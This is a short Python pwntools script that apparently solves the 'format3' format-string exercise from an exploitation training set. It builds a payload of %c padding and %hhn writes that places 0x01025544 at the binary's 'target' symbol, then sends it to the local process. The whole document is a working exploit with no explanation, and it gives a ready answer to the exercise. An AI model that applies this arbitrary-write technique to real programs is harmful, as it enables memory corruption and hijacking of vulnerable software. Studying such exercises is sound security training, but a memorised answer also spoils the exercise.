from pwn import *
import time

p = process('./format3')
e = ELF('./format3')
target_addr = e.symbols['target'] # 0x00020718


# Creating Payload
payload = b''

# 0x01025544
fmt = '%{}c'.format(0x44)		 # 8th
fmt += '%20$hhn'

fmt += '%{}c'.format(0x55 - 0x44)
fmt += '%21$hhn'

fmt += '%{}c'.format(0x102 - 0x55)
fmt += '%22$hhn'

fmt += '%{}c'.format(0x201 - 0x102)
fmt += '%23$hhn'

payload += fmt.encode()
payload += b'aa'		         # 19th (padding)

payload += p32(target_addr)              # 20th
payload += p32(target_addr+1)		 # 21st
payload += p32(target_addr+2)		 # 22nd
payload += p32(target_addr+3)		 # 23rd

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

print(p.recvline())
